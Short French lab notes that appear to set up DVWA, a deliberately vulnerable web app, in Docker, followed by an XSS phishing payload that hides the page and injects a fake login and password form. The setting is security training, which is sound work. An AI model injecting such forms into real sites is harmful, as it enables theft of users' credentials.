# Cyber X Security

## Ressources

- [Lien du package DVWA Image Docker](https://hub.docker.com/r/vulnerables/web-dvwa)
- []()
- []()
- []()
- []()


## Install on Docker

```bash
docker pull cyberxsecurity/dvwa
```

Démarrage d'un docker dvwa 
Name : dvwa1
Port : 81

```bash
docker container run -d --name=dvwa1 -p 81:80 cyberxsecurity/dvwa
```

## X-XSS Failures - Fishing

Utilies :

- [URL Encode/Decode](https://www.url-encode-decode.com/)

Formulaire test login d'integration lors d'une faille XSS trouvée

Attention à remplacer l'url avec l'encodage via Url Encode/Decode

```html

<!-- Suppression de tout les autres éléments html -->
<style>* {overflow: hidden;}</style>

<!-- Ajout de nos nouveaux element html -->

<div>
    <form>
        <p>Login : <input type="text" name="login"></p>
        <p>Password: <input type="text" name="password"></p>
        <button type="submit" >Se connecter</button>
    </form>
</div>


```